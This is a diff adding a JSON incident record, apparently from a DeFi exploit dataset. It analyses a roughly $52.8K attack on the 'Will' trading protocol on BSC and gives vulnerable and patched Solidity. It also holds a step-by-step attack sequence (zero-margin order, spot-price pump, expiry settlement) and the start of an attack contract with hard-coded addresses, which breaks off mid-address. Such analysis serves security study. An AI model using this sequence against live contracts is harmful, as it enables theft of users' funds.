@@ -1,0 +1,39 @@
+{
+ "id": "2024__2024-06-XX_Will_PlaceSellOrderExpiredSettlement",
+ "source_file": "2024/2024-06-XX_Will_PlaceSellOrderExpiredSettlement.md",
+ "title": "Will — placeSellOrder() + updateExpiredOrders() Expired Order Settlement Vulnerability Analysis",
+ "date": "2024-06-01",
+ "protocol": "Will",
+ "chain": "BSC",
+ "loss_raw": "~$52,777",
+ "loss_usd": 52777.0,
+ "root_cause": "`placeSellOrder()` allows order creation with zero margin, and `updateExpiredOrders()` + `settleExpiredPositions()` settle expired orders at a price-favorable rate, enabling theft of WILL token sale profits",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: placeSellOrder allows zero margin\ncontract TradingProtocol {\n    struct Order {\n        address trader;\n        uint256 amount;\n        uint256 margin;\n        uint256 price;\n        uint256 expiry;\n        bool settled;\n    }\n    Order[] public orders;\n\n    function placeSellOrder(\n        uint256 amount,\n        uint256 margin,  // 0 allowed — no validation\n        uint256 price\n    ) external {\n        // No minimum margin validation\n        USDT.transferFrom(msg.sender, address(this), margin); // no transfer if 0\n        orders.push(Order(msg.sender, amount, margin, price, block.timestamp + 20 seconds, false));\n    }\n\n    function updateExpiredOrders() external {\n        for (uint i = 0; i < orders.length; i++) {\n            if (block.timestamp >= orders[i].expiry && !orders[i].settled) {\n                orders[i].settled = true;\n                // Mark as expired — settle without price validation\n            }\n        }\n    }\n\n    function settleExpiredPositions() external {\n        for (uint i = 0; i < orders.length; i++) {\n            if (orders[i].settled) {\n                // Settle at current market price (manipulable)\n                uint256 currentPrice = getSpotPrice(); // WILL spot price\n                uint256 profit = calculateProfit(orders[i], currentPrice);\n                USDT.transfer(orders[i].trader, profit);\n            }\n        }\n    }\n}\n\n//",
+  "// File: Will_decompiled.sol\ncontract Will {\n    function placeSellOrder(uint256 p0, uint256 p1, uint256 p2) external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code\nfunction placeSellOrder(uint256 amount, uint256 margin, uint256 price) external {\n    require(margin >= MIN_MARGIN_RATIO * amount / 100, \"insufficient margin\");\n    require(amount > 0 && price > 0, \"invalid params\");\n    USDT.transferFrom(msg.sender, address(this), margin);\n    orders.push(Order(msg.sender, amount, margin, price, block.timestamp + MIN_ORDER_DURATION, false));\n}\n\nfunction settleExpiredPositions() external {\n    // Use TWAP price (defense against spot price manipulation)\n    uint256 twapPrice = getTWAPPrice();\n    // ...\n}"
+ ],
+ "steps": [
+  "→ [1] USDT.approve(trading, maxAmount)",
+  "→ [2] trading.placeSellOrder(71,000 USDT, margin=0, price)",
+  "No margin validation → zero margin order created",
+  "→ [3] Router.swapExactTokensForTokens(88,000 USDT → WILL)",
+  "Large WILL purchase → WILL price increases",
+  "→ [4] Wait 20 seconds (vm.warp +20s)",
+  "→ [5] trading.updateExpiredOrders()",
+  "→ [6] trading.settleExpiredPositions()",
+  "→ [7] Held WILL → swap back to USDT",
+  "→ [8] ~$52.8K profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] USDT.approve(trading, maxAmount)\n  │\n  ├─→ [2] trading.placeSellOrder(71,000 USDT, margin=0, price)\n  │         └─ No margin validation → zero margin order created\n  │         └─ expiry = block.timestamp + 20 seconds\n  │\n  ├─→ [3] Router.swapExactTokensForTokens(88,000 USDT → WILL)\n  │         └─ Large WILL purchase → WILL price increases\n  │\n  ├─→ [4] Wait 20 seconds (vm.warp +20s)\n  │         └─ Order expiry time reached\n  │\n  ├─→ [5] trading.updateExpiredOrders()\n  │         └─ Order marked as expired (settled = true)\n  │\n  ├─→ [6] trading.settleExpiredPositions()\n  │         └─ Settle at manipulated WILL spot price\n  │         └─ USDT paid out in attacker's favor\n  │\n  ├─→ [7] Held WILL → swap back to USDT\n  │\n  └─→ [8] ~$52.8K profit",
+  "interface ITrading {\n    function placeSellOrder(uint256 amount, uint256 margin, uint256 price) external;\n    function updateExpiredOrders() external;\n    function settleExpiredPositions() external;\n}\n\ninterface IUniswapV2Router {\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory);\n}\n\ncontract AttackContract {\n    ITrading constant trading = ITrading(0x566777eD780dbbe17c130AE97b9FbC0A3Ab829DF);\n    IERC20 constant WILL = IERC20(0xe38593e7F4f2411E0C0aB74589A7209681ab4B1d);\n    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IUniswapV2Router constant router = IUniswapV2Router(0x10ED43C718714eb63d5aA5"
+ ]
+}
